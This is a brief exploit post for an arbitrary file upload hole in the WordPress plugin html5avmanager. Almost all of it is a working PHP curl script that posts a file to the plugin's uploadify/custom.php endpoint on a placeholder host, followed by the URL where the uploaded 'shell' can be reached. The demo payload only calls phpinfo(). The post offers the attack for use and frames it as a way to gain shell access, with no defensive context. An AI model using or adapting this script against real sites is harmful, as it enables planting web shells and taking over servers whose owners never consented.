Exploit :
 
PostShell.php
<?php
 
$uploadfile="lo.php";
$ch =
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/html5avmanager/lib/uploadify/custom.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
         array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";
 
?>
 
Shell Access :
http://www.exemple.com/wordpress/wp-content/videoaudio/temp/lo.php
 
lo.php
<?php
phpinfo();
?>

